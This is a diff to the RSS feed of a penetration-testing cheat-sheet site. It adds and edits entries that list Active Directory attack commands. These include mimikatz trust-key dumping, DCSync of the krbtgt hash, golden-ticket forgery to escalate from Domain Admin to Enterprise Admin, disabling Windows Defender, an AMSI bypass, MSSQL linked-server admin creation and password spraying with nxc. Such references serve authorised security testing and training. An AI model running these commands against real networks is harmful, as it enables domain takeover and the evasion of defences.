@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Abuse Parent Child Domain Trusts</title>
+      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
+      <description>Privesc from DA to EA Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; Forge a golden ticket # Append &amp;#39;-519&amp;#39; to target domain SID ./mimikatz.exe &amp;#39;kerberos::golden /user:Administrator /rc4:&amp;lt;HASH&amp;gt; /domain:CURRENT.EXAMPLE.COM /sid:&amp;lt;CURRENT_DOMAIN_SID&amp;gt; /sids:&amp;lt;TARGET_DOMAIN_SID&amp;gt;-519 /ticket:c:\windows\tasks\ticket.kirbi&amp;#39; &amp;#39;exit&amp;#39; Note: May need to try different high value hashes&#xA;Request a tgt ticket of target domain .</description>
+    </item>
+    <item>
       <title>AD Recycle Bin</title>
       <link>https://tldrbins.github.io/ad_recycle_bin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -54,14 +61,14 @@
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all </description>
+      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound.py python3 bloodhound.py -d example.com -u username -p password -dc example.com -ns 10.10.11.10 -c all --zip </description>
     </item>
     <item>
       <title>Bypass ASMI</title>
       <link>https://tldrbins.github.io/bypas_asmi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bypas_asmi/</guid>
-      <description>evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
+      <description>Payloads Using Hardware Breakpoints&#xA;Scanning Interception&#xA;Note: Tried these 2 and worked&#xA;evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
     </item>
     <item>
       <title>Compressed Files</title>
@@ -104,6 +111,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/custom_wordlist_generator/</guid>
       <description> CeWL Download CeWL&#xA;# Creating custom wordlist by spidering target website cewl example.com -w example.com.wordlist --with-numbers </description>
+    </item>
+    <item>
+      <title>Defender (Windows)</title>
+      <link>https://tldrbins.github.io/windows_defender/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_defender/</guid>
+      <description> Disable defender # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
     </item>
     <item>
       <title>disk</title>
@@ -355,7 +369,7 @@
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ldap/</guid>
-      <description> Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -h 10.10.11.10 -s base namingcontexts # Get info about domain ldapsearch -x -h 10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -h 10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; </description>
+      <description>Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
     </item>
     <item>
       <title>Linux hard disk encryption</title>
@@ -446,14 +460,14 @@
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.</description>
+      <description>General Connect to MSSQL DB impacket-mssqlclient -windows-auth username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
       <link>https://tldrbins.github.io/mssql_linked_server/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
-      <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [DOMAIN\LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [DOMAIN\CURRENT_SERVER]&amp;#39;) at [DOMAIN\LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
+      <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
@@ -481,7 +495,7 @@
       <link>https://tldrbins.github.io/nxc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nxc/</guid>
-      <description>nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash WINRM # Single user and password nxc winrm 10.</description>
+      <description> nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ </description>
     </item>
     <item>
       <title>Network Discovery</title>
